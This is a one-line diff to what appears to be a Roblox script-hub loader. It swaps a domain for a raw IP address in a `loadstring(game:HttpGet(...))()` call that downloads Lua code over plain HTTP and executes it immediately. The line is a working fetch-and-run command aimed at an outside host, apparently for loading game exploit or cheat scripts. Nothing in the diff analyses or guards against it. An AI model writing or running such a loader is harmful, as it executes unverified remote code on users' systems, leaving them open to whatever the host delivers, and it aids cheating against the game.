@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(('http://zerotwohub.tk/hub')))()
+loadstring(game:HttpGet(('http://213.47.107.152/hub')))()
